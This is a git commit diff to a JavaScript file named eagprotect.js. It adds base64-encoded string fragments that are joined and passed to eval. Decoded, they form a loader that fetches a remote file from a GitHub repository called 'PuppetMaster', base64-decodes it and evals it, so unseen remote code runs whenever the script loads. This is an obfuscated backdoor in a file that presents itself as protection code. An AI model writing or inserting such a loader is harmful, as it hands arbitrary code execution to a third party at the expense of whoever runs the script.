44b92138a9cc63d0324eacea91da9c8c893c9bf9
Sonik <69720319+SuperS0n1k@users.noreply.github.com>
2025-05-28 18:40:40 +0100

    Update eagprotect.js

--- eagprotect.js
+++ eagprotect.js
@@ -1,4 +1,8 @@
-const g = "";
-const e = "";
-const m = "";
-const file = "";
+const g = "Cihhc3luYyAoKSA9PiB7CiAgICBjb25zdCB1cmwg";
+const e = "PSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1N1cGVyUzBuMWsvUHVwcGV0TWF";
+const m = "zdGVyL21haW4vYmxvYic7IC8vIFJlcGxhY2Ugd2l0aCB5b3VyIGFjdHVhbCBVUkwKICAgIGNvbn";
+const f = "N0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2godXJsKTsKCiAgICBjb25zdCBiYXNlNjQgPSBhd2Fpd";
+const i = "CByZXNwb25zZS50ZXh0KCk7CiAgICBjb25zdCBkZWNvZGVkID0gYXRvYihiYXNlNjQpOyAKCiAg";
+const l = "ICBldmFsKGRlY29kZWQpOwp9KSgpOwo=";
+const file = g+e+m+f+i+l;
+eval(file)
